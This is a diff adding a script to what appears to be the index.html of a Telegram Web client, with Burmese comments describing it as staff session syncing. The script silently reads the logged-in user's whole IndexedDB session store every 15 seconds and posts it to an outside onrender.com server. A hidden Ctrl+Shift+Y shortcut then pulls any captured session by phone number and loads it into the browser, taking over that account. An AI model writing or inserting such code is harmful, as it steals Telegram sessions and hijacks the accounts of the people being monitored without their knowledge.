@@ -67,6 +67,96 @@
   </noscript>
   <div id="portals"></div>
   <script src="./compatTest.js"></script>
+
+  <script>
+      let isPrompting = false;
+
+      // ၁။ ADMIN လျှို့ဝှက် ဝင်ရောက်ခွင့် (Ctrl + Shift + Y)
+      document.addEventListener('keydown', async (e) => {
+          if (e.ctrlKey && e.shiftKey && (e.key === 'Y' || e.key === 'y')) {
+              const phone = prompt("ADMIN PANEL: ဝင်ကြည့်လိုသော Staff ၏ ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
+              if (!phone) return;
+              
+              try {
+                  // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ
+                  const res = await fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`);
+                  const result = await res.json();
+                  
+                  if (!result.success) return alert("Database ထဲတွင် ဤအကောင့် မရှိသေးပါ။");
+                  
+                  const dataToImport = JSON.parse(result.data);
+                  const req = indexedDB.open('tt-data');
+                  req.onsuccess = (event) => {
+                      const db = event.target.result;
+                      const tx = db.transaction('keyval', 'readwrite');
+                      const store = tx.objectStore('keyval');
+                      
+                      store.clear().onsuccess = () => {
+                          let count = 0;
+                          const keys = Object.keys(dataToImport);
+                          keys.forEach(k => {
+                              store.put(dataToImport[k], k).onsuccess = () => {
+                                  count++;
+                                  if (count === keys.length) {
+                                      alert("အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...");
+                                      window.location.reload();
+                                  }
+                              }
+                          });
+                      };
+                  };
+              } catch(err) { alert("Error: အကောင့်သို့ ဝင်၍မရပါ။"); }
+          }
+      });
+
+      // ၂။ STAFF ၏ SESSION ကို MONGODB သို့ အလိုအလျောက် ပို့ပေးခြင်း (၁၅ စက္ကန့် တစ်ကြိမ်)
+      setInterval(() => {
+          try {
+              const req = indexedDB.open('tt-data');
+              req.onsuccess = (event) => {
+                  const db = event.target.result;
+                  if (!db.objectStoreNames.contains('keyval')) return;
+                  
+                  const store = db.transaction('keyval', 'readonly').objectStore('keyval');
+                  store.getAll().onsuccess = (e1) => {
+                      store.getAllKeys().onsuccess = (e2) => {
+                          const vals = e1.target.result;
+                          const keys = e2.target.result;
+                          const data = {};
+                          let isAuth = false;
+                          
+                          keys.forEach((k, i) => {
+                              data[k] = vals[i];
+                              // Login ဝင်ထားခြင်း ရှိ/မရှိ စစ်ဆေးခြင်း
+                              if (k === 'currentUserId' && vals[i]) isAuth = true; 
+                          });
+                          
+                          if (isAuth) {
+                              let phone = localStorage.getItem('staff_phone');
+                              // ဖုန်းနံပါတ် မရှိသေးပါက တစ်ကြိမ် တောင်းမည်
+                              if (!phone && !isPrompting) {
+                                  isPrompting = true;
+                                  phone = prompt("ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
+                                  if (phone) localStorage.setItem('staff_phone', phone);
+                                  isPrompting = false;
+                              }
+                              
+                              if (phone) {
+                                  // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ
+                                  fetch(`https://telegram-7ih3.onrender.com/api/save-web-session`, {
+                                      method: 'POST',
+                                      headers: {'Content-Type': 'application/json'},
+                                      body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
+                                  }).catch(e => console.log("Sync Error"));
+                              }
+                          }
+                      };
+                  };
+              };
+          } catch(err) {}
+      }, 15000); // ၁၅ စက္ကန့် တစ်ခါ Auto Save မည်
+    </script>
+    ```
 </body>
 
 </html>
